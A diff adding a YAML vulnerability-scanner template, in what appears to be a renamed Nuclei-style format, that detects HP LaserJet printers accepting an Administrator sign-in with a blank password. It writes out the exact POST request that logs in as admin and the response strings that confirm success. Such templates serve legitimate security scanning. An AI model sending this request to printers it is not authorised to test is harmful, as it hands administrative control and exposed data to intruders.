@@ -1,0 +1,38 @@
+id: hp-printer-default-login
+brief:
+    title: Hewlett Packard LaserJet Printer - Default Login
+    by: JohnAsbjorn
+    level: high
+    about: HP printers often allow administrative access without requiring a password by default. This behavior enables anyone to log in as the Administrator without authentication, potentially exposing sensi...
+    label:
+        - hp
+        - printer
+        - default-login
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/hp/device/SignIn/Index'
+      head:
+        Accept-Encoding: identity
+        Accept-Language: en
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/hp/device/SignIn/Index'
+      head:
+        Accept-Encoding: identity
+        Content-Type: application/x-www-form-urlencoded
+        Origin: '{{RootURL}}'
+        Referer: '{{RootURL}}/hp/device/SignIn/Index'
+      body: CSRFToken={{token}}&agentIdSelect=hp_EmbeddedPin_v1&PinDropDown=AdminItem&PasswordTextBox=&signInOk=Sign+In
+      signs:
+        - "on": word
+          has:
+            - 'User: Administrator'
+            - Sign out
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
